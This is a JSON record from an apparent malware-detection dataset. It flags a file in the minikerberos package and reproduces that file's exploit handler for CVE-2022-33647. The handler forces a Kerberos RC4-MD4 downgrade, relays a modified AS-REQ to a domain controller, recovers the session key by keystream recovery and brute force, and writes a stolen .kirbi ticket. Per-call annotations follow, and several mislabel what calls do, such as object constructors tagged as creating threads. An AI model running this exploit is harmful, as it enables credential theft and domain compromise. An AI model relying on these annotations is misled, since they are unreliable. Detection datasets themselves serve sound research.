{
  "metadata": {
    "package_name": "minikerberos-0",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/code_contexral/codesnippets/benign_bandit4mal/minikerberos-0.4.4.json",
    "dataset_type": "benign_bandit4mal"
  },
  "code_files": [
    {
      "pyfile": "CVE_2022_33647.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_benign/minikerberos-0.4.4/minikerberos-0.4.4/minikerberos/examples/CVE_2022_33647.py",
      "line_number": "277",
      "type_description": "B815:write",
      "context_snippet": "async def handle_client(self, reader, writer):\n    dcwriter = None\n    try:\n        addr = writer.get_extra_info('peername')\n        saddr = '%s:%s' % (addr[0], addr[1])\n        print('[+] Client connected from %s' % (saddr))\n\n        ticketdata, ticket, ticketnative, err = await self.read_ticket(reader)\n        if err is not None:\n            raise err\n        if ticketnative['msg-type'] != 10:\n            print('[-] Not expected ticket arrived from client. Msg type: %s' % ticketnative['msg-type'])\n            return\n        \n        for padata in ticketnative['padata']:\n            if padata['padata-type'] == 2: #and padata[]:\n                ed = EncryptedData.load(padata['padata-value']).native\n                if ed['etype'] == -128:\n                    enc_timestamp = ed['cipher'][24:]\n                    break\n        #This is AS-REQ\n        else:\n            # not the expected encryption type, sending error message to client,\n            # informing it that we only support etype -128\n            print('[+] Downgrading Kerberos encryption to RC4_MD4')\n            now = datetime.datetime.now(datetime.timezone.utc)\n            realm = ticketnative['req-body']['realm']\n            pad1 = PA_DATA({\n                'padata-type' : PaDataType.ETYPE_INFO2.value,\n                'padata-value': ETYPE_INFO2([{'etype' : -128}]).dump()\n            })\n            pad2 = PA_DATA({\n                'padata-type' : 2,\n                'padata-value': b'',\n            })\n            pad3 = PA_DATA({\n                'padata-type' : 15,\n                'padata-value': b'',\n            })\n            pad4 = PA_DATA({\n                'padata-type' : 16,\n                'padata-value': b'',\n            })\n            md = [pad1, pad2, pad3, pad4]\n            \n            err = {\n                'pvno' : 5,\n                'msg-type': 30,\n                #'ctime': None\n                #'cusec': None,\n                'stime' : now.replace(microsecond=0),\n                'susec' : now.microsecond,\n                'error-code' : 25,\n                #'crealm' : None,\n                #'cname' : None,\n                'realm' : realm,\n                'sname' : PrincipalName({'name-type': 1, 'name-string': ['krbtgt', realm]}),# krbtgt name..,\n                #'e-text' : None,\n                'e-data': METHOD_DATA(md).dump()\n\n            }\n            ticketdata = KRB_ERROR(err).dump()\n\n            _, err = await self.send_ticket(writer, ticketdata)\n            if err is not None:\n                raise err\n            return\n        \n        print('[+] Connecting to DC at %s:%s' % (self.dc_ip, self.dc_port))\n        dcreader, dcwriter = await asyncio.open_connection(self.dc_ip, self.dc_port)\n        print('[+] Connected to DC!')\n        print('[+] Modifying original AS-REQ...')\n        ticketnative['req-body']['addresses'] = get_padding_data()\n        modded_ticket = AS_REQ(ticketnative).dump()\n        _, err = await self.send_ticket(dcwriter, modded_ticket)\n        if err is not None:\n            raise err\n        print('[+] Submitting original AS-REQ to DC')\n        rticketdata, rticket, rticketnative, err = await self.read_ticket(dcreader)\n        if err is not None:\n            raise err\n        print('[+] Got AS-REP with the correct enctype!')\n        cipher_data = rticketnative['enc-part']['cipher'][24:]\n        known_plaintext = calc_known_plaintext(rticketnative['enc-part']['cipher'][24:])\n        if len(known_plaintext) < 21:\n            print('[-] AS-REP cipher data too short! Will not work..')\n            return\n        print('[i] ENC TIMESTAMP: %s' % enc_timestamp.hex())\n        print('[i] AS-REP CIPHER: %s' % cipher_data.hex()[:0x40])\n        \n        \n        ts_bytes = enc_timestamp[len(known_plaintext):]\n        cipher_bytes = cipher_data[len(known_plaintext):]\n        keystream = byte_xor(ts_bytes, ts_len_hdr_lookup[len(enc_timestamp)])\n        dec_key = byte_xor(keystream, cipher_bytes)\n        print('[i] ENC BYTESTREAM   : %s' % ts_bytes.hex())\n        print('[i] CIP BYTESTREAM   : %s' % cipher_bytes.hex()[:0x40])\n        print('[i] KNOWN PLAINTEXT  : %s' % known_plaintext.hex())\n        print('[i] KEYSTREAM FROM TS: %s' % keystream.hex())\n        print('[i] DEC KEY - 4 BYTES: %s' % dec_key.hex())\n        print('[+] Guessing last bytes of the session key...')\n        target = KerberosTarget(self.dc_ip)\n        credential = KerberosCredential()\n        credential.username = ticketnative['req-body']['cname']['name-string'][0]\n        credential.domain = ticketnative['req-body']['realm']\n        credential.password = 'A'\n        client = AIOKerberosClient(credential, target)\n        client.kerberos_TGT = rticketnative\n        for i in range(256):\n            i = i.to_bytes(1, byteorder='big', signed=False)\n            keyguess = dec_key + i + b'\\xAB'*11\n            print('[i] GUESSING KEY: %s' % keyguess.hex())\n            \n            client.kerberos_TGT = rticketnative\n            client.kerberos_cipher = _enctype_table[-128]\n            client.kerberos_cipher_type = -128\n            client.kerberos_session_key = Key(-128, keyguess)\n            try:\n                await client.get_TGS(KerberosSPN.from_upn('krbtgt@test.corp'))\n            except Exception as e:\n                continue\n            else:\n                now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)\n                print('[+] GUESSED CORRECTLY! SESSIONKEY: %s' % keyguess.hex())\n                kirbi = tgt_to_kirbi(rticketnative, keyguess, now).dump()\n                print('[+] KIRBI DATA:')\n                print(format_kirbi(kirbi))\n                filename = '%s.kirbi' % (now.strftime(\"%Y%m%d_%H%M%S\"))\n                print('[+] Writing .kirbi file to: %s' % filename)\n                with open(filename, 'wb') as f:\n                    f.write(kirbi)\n                return\n\n    except Exception as e:\n        traceback.print_exc()\n        #return None, e\n    finally:\n        if dcwriter is not None:\n            dcwriter.close()\n        writer.close()",
      "hash_value": "48e8a8c94a52c923b7a5a381bce848b7",
      "severity": "High",
      "confidence": "Medium",
      "code_snippets": [
        {
          "snippet": "async def handle_client(self, reader, writer):\n    dcwriter = None\n    try:\n        addr = writer.get_extra_info('peername')\n        saddr = '%s:%s' % (addr[0], addr[1])\n        print('[+] Client connected from %s' % (saddr))\n\n        ticketdata, ticket, ticketnative, err = await self.read_ticket(reader)\n        if err is not None:\n            raise err\n        if ticketnative['msg-type'] != 10:\n            print('[-] Not expected ticket arrived from client. Msg type: %s' % ticketnative['msg-type'])\n            return\n        \n        for padata in ticketnative['padata']:\n            if padata['padata-type'] == 2: #and padata[]:\n                ed = EncryptedData.load(padata['padata-value']).native\n                if ed['etype'] == -128:\n                    enc_timestamp = ed['cipher'][24:]\n                    break\n        #This is AS-REQ\n        else:\n            # not the expected encryption type, sending error message to client,\n            # informing it that we only support etype -128\n            print('[+] Downgrading Kerberos encryption to RC4_MD4')\n            now = datetime.datetime.now(datetime.timezone.utc)\n            realm = ticketnative['req-body']['realm']\n            pad1 = PA_DATA({\n                'padata-type' : PaDataType.ETYPE_INFO2.value,\n                'padata-value': ETYPE_INFO2([{'etype' : -128}]).dump()\n            })\n            pad2 = PA_DATA({\n                'padata-type' : 2,\n                'padata-value': b'',\n            })\n            pad3 = PA_DATA({\n                'padata-type' : 15,\n                'padata-value': b'',\n            })\n            pad4 = PA_DATA({\n                'padata-type' : 16,\n                'padata-value': b'',\n            })\n            md = [pad1, pad2, pad3, pad4]\n            \n            err = {\n                'pvno' : 5,\n                'msg-type': 30,\n                #'ctime': None\n                #'cusec': None,\n                'stime' : now.replace(microsecond=0),\n                'susec' : now.microsecond,\n                'error-code' : 25,\n                #'crealm' : None,\n                #'cname' : None,\n                'realm' : realm,\n                'sname' : PrincipalName({'name-type': 1, 'name-string': ['krbtgt', realm]}),# krbtgt name..,\n                #'e-text' : None,\n                'e-data': METHOD_DATA(md).dump()\n\n            }\n            ticketdata = KRB_ERROR(err).dump()\n\n            _, err = await self.send_ticket(writer, ticketdata)\n            if err is not None:\n                raise err\n            return\n        \n        print('[+] Connecting to DC at %s:%s' % (self.dc_ip, self.dc_port))\n        dcreader, dcwriter = await asyncio.open_connection(self.dc_ip, self.dc_port)\n        print('[+] Connected to DC!')\n        print('[+] Modifying original AS-REQ...')\n        ticketnative['req-body']['addresses'] = get_padding_data()\n        modded_ticket = AS_REQ(ticketnative).dump()\n        _, err = await self.send_ticket(dcwriter, modded_ticket)\n        if err is not None:\n            raise err\n        print('[+] Submitting original AS-REQ to DC')\n        rticketdata, rticket, rticketnative, err = await self.read_ticket(dcreader)\n        if err is not None:\n            raise err\n        print('[+] Got AS-REP with the correct enctype!')\n        cipher_data = rticketnative['enc-part']['cipher'][24:]\n        known_plaintext = calc_known_plaintext(rticketnative['enc-part']['cipher'][24:])\n        if len(known_plaintext) < 21:\n            print('[-] AS-REP cipher data too short! Will not work..')\n            return\n        print('[i] ENC TIMESTAMP: %s' % enc_timestamp.hex())\n        print('[i] AS-REP CIPHER: %s' % cipher_data.hex()[:0x40])\n        \n        \n        ts_bytes = enc_timestamp[len(known_plaintext):]\n        cipher_bytes = cipher_data[len(known_plaintext):]\n        keystream = byte_xor(ts_bytes, ts_len_hdr_lookup[len(enc_timestamp)])\n        dec_key = byte_xor(keystream, cipher_bytes)\n        print('[i] ENC BYTESTREAM   : %s' % ts_bytes.hex())\n        print('[i] CIP BYTESTREAM   : %s' % cipher_bytes.hex()[:0x40])\n        print('[i] KNOWN PLAINTEXT  : %s' % known_plaintext.hex())\n        print('[i] KEYSTREAM FROM TS: %s' % keystream.hex())\n        print('[i] DEC KEY - 4 BYTES: %s' % dec_key.hex())\n        print('[+] Guessing last bytes of the session key...')\n        target = KerberosTarget(self.dc_ip)\n        credential = KerberosCredential()\n        credential.username = ticketnative['req-body']['cname']['name-string'][0]\n        credential.domain = ticketnative['req-body']['realm']\n        credential.password = 'A'\n        client = AIOKerberosClient(credential, target)\n        client.kerberos_TGT = rticketnative\n        for i in range(256):\n            i = i.to_bytes(1, byteorder='big', signed=False)\n            keyguess = dec_key + i + b'\\xAB'*11\n            print('[i] GUESSING KEY: %s' % keyguess.hex())\n            \n            client.kerberos_TGT = rticketnative\n            client.kerberos_cipher = _enctype_table[-128]\n            client.kerberos_cipher_type = -128\n            client.kerberos_session_key = Key(-128, keyguess)\n            try:\n                await client.get_TGS(KerberosSPN.from_upn('krbtgt@test.corp'))\n            except Exception as e:\n                continue\n            else:\n                now = datetime.datetime.now(datetime.timezone.utc).replace(microsecond=0)\n                print('[+] GUESSED CORRECTLY! SESSIONKEY: %s' % keyguess.hex())\n                kirbi = tgt_to_kirbi(rticketnative, keyguess, now).dump()\n                print('[+] KIRBI DATA:')\n                print(format_kirbi(kirbi))\n                filename = '%s.kirbi' % (now.strftime(\"%Y%m%d_%H%M%S\"))\n                print('[+] Writing .kirbi file to: %s' % filename)\n                with open(filename, 'wb') as f:\n                    f.write(kirbi)\n                return\n\n    except Exception as e:\n        traceback.print_exc()\n        #return None, e\n    finally:\n        if dcwriter is not None:\n            dcwriter.close()\n        writer.close()",
          "triple_sequences": [
            {
              "action_api": "writer.get_extra_info()",
              "action_description": "Retrieves local address of the socket",
              "action_id": "get_socket_local_addr",
              "object": "'peername'",
              "object_description": "Socket address",
              "object_id": "socket_address",
              "intention_description": "Collect_ip_address",
              "intention_id": "collect_ip_address"
            },
            {
              "action_api": "self.read_ticket()",
              "action_description": "Receives data from socket connection",
              "action_id": "receive_socket_data",
              "object": "reader",
              "object_description": "Socket address",
              "object_id": "socket_address",
              "intention_description": "Receive_command_from_server",
              "intention_id": "receive_command_from_server"
            },
            {
              "action_api": "EncryptedData.load()",
              "action_description": "Deserializes Python object from bytes",
              "action_id": "deserialize_from_bytes",
              "object": "padata['padata-value']",
              "object_description": "Obfuscated_byte_string",
              "object_id": "obfuscated_byte_string",
              "intention_description": "Decode_obfuscated_data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "datetime.datetime.now()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "datetime.timezone.utc",
              "object_description": "Timezone string",
              "object_id": "",
              "intention_description": "Get_datetime_epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "PA_DATA()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "{'padata-type' : PaDataType.ETYPE_INFO2.value, 'padata-value': ETYPE_INFO2([{'etype' : -128}]).dump()}",
              "object_description": "Dictionary object",
              "object_id": "",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "METHOD_DATA().dump()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "md",
              "object_description": "Character_code_array",
              "object_id": "character_code_array",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "KRB_ERROR().dump()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "err",
              "object_description": "Dictionary object",
              "object_id": "",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "self.send_ticket()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "writer, ticketdata",
              "object_description": "Socket address",
              "object_id": "socket_address",
              "intention_description": "Send_data_server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "asyncio.open_connection()",
              "action_description": "Establishes TCP connection to specified address",
              "action_id": "establish_tcp_connection",
              "object": "self.dc_ip, self.dc_port",
              "object_description": "Public_ip_port",
              "object_id": "public_ip_port",
              "intention_description": "Connect_remote_server",
              "intention_id": "connect_remote_server"
            },
            {
              "action_api": "get_padding_data()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "AS_REQ().dump()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "ticketnative",
              "object_description": "Dictionary object",
              "object_id": "",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "self.send_ticket()",
              "action_description": "Sends data over socket connection",
              "action_id": "send_socket_data",
              "object": "dcwriter, modded_ticket",
              "object_description": "Socket address",
              "object_id": "socket_address",
              "intention_description": "Send_data_server",
              "intention_id": "send_data_server"
            },
            {
              "action_api": "self.read_ticket()",
              "action_description": "Receives data from socket connection",
              "action_id": "receive_socket_data",
              "object": "dcreader",
              "object_description": "Socket address",
              "object_id": "socket_address",
              "intention_description": "Receive_command_from_server",
              "intention_id": "receive_command_from_server"
            },
            {
              "action_api": "calc_known_plaintext()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "rticketnative['enc-part']['cipher'][24:]",
              "object_description": "Obfuscated_byte_string",
              "object_id": "obfuscated_byte_string",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "byte_xor()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "ts_bytes, ts_len_hdr_lookup[len(enc_timestamp)]",
              "object_description": "Obfuscated_byte_string",
              "object_id": "obfuscated_byte_string",
              "intention_description": "Prepare_character_xor",
              "intention_id": "prepare_character_xor"
            },
            {
              "action_api": "byte_xor()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "keystream, cipher_bytes",
              "object_description": "Obfuscated_byte_string",
              "object_id": "obfuscated_byte_string",
              "intention_description": "Prepare_character_xor",
              "intention_id": "prepare_character_xor"
            },
            {
              "action_api": "KerberosTarget()",
              "action_description": "Instantiates EVIL class",
              "action_id": "init_evil_class",
              "object": "self.dc_ip",
              "object_description": "Public_ip_address",
              "object_id": "public_ip_address",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "KerberosCredential()",
              "action_description": "Instantiates EVIL class",
              "action_id": "init_evil_class",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "AIOKerberosClient()",
              "action_description": "Instantiates EVIL class",
              "action_id": "init_evil_class",
              "object": "credential, target",
              "object_description": "Account_credentials",
              "object_id": "account_credentials",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "Key()",
              "action_description": "Instantiates EVIL class",
              "action_id": "init_evil_class",
              "object": "-128, keyguess",
              "object_description": "Hardcoded_key",
              "object_id": "hardcoded_key",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "client.get_TGS()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "KerberosSPN.from_upn('krbtgt@test.corp')",
              "object_description": "Account_credentials",
              "object_id": "account_credentials",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "datetime.datetime.now()",
              "action_description": "Returns current time",
              "action_id": "get_current_time",
              "object": "datetime.timezone.utc",
              "object_description": "Timezone string",
              "object_id": "",
              "intention_description": "Get_datetime_epoch",
              "intention_id": "get_datetime_epoch"
            },
            {
              "action_api": "tgt_to_kirbi().dump()",
              "action_description": "Serializes Python object to JSON string",
              "action_id": "serialize_to_json",
              "object": "rticketnative, keyguess, now",
              "object_description": "Account_credentials",
              "object_id": "account_credentials",
              "intention_description": "Serialize_data",
              "intention_id": "serialize_data"
            },
            {
              "action_api": "format_kirbi()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "kirbi",
              "object_description": "Obfuscated_byte_string",
              "object_id": "obfuscated_byte_string",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "filename, 'wb'",
              "object_description": "File_path",
              "object_id": "file_path",
              "intention_description": "Open_file_writing",
              "intention_id": "open_file_writing"
            },
            {
              "action_api": "file.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "kirbi",
              "object_description": "Obfuscated_byte_string",
              "object_id": "obfuscated_byte_string",
              "intention_description": "Write_file_content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "traceback.print_exc()",
              "action_description": "Creates new thread to execute",
              "action_id": "create_thread",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Prepare_data_processing",
              "intention_id": "prepare_data_processing"
            },
            {
              "action_api": "dcwriter.close()",
              "action_description": "Closes the socket connection",
              "action_id": "close_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release_connection_resource",
              "intention_id": "release_connection_resource"
            },
            {
              "action_api": "writer.close()",
              "action_description": "Closes the socket connection",
              "action_id": "close_socket",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Release_connection_resource",
              "intention_id": "release_connection_resource"
            }
          ]
        }
      ]
    }
  ]
}